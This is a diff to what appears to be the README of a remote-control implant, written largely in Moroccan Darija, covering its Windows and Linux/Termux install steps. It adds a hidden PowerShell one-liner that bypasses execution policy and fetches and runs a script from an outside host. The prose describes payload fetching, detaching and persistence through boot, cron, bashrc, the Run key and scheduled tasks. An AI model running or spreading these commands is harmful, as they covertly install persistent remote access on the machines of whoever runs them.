@@ -32,10 +32,13 @@ Linux / Termux / Android:
 
 Windows (hidden):
 
-    powershell -w hidden -c "irm https://1uciferxyz.com/i.ps1 | iex"
+    powershell -NoProfile -ExecutionPolicy Bypass -w hidden -c "irm https://1uciferxyz.com/i.ps1 | iex"
 
-L'installer kaydir: python install (ila khass), payload fetch, detach,
-wake-lock, persistence (boot/cron/bashrc wla schtasks).
+L'installer kaydir: python embed (machi l'python dyal l'system), payload fetch,
+detach, persistence (boot/cron/bashrc wla Run key + schtasks).
+Ila l'PC 3ndou ghir l'stub dyal Microsoft Store (`WindowsApps\python.exe`),
+l'script kaytnzzel Python bouhdo w kay-verifih b `print(1)` 9bel ma ysta3mlou.
+L'log dyal kol khatwa: `%LOCALAPPDATA%\svc\boot.log`.
 
 ## 3. L'control mn Termux
 
